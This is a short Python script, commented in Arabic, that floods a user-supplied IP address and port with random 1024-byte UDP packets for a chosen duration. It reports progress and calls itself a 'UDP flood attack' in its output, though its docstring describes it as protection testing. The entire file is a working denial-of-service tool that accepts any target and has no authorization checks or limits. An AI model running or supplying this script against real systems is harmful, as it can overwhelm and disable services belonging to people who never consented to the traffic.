import socket
import random
import time

def udp_flood(target_ip, target_port, duration):
    """
    سكربت لإرسال كمية كبيرة من حزم UDP لاختبار الحماية.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)  # إنشاء حزمة بحجم 1024 بايت
    timeout = time.time() + duration
    sent_packets = 0

    print(f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds...")
    while time.time() < timeout:
        try:
            client.sendto(packet, (target_ip, target_port))
            sent_packets += 1
            if sent_packets % 100 == 0:  # عرض تقدم العملية كل 100 حزمة
                print(f"{sent_packets} packets sent.")
        except KeyboardInterrupt:
            print("\nAttack stopped by user.")
            break
        except Exception as e:
            print(f"Error: {e}")
            break

    print(f"Attack completed. Total packets sent: {sent_packets}")

if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    duration = int(input("Enter duration (in seconds): "))

    udp_flood(target_ip, target_port, duration)
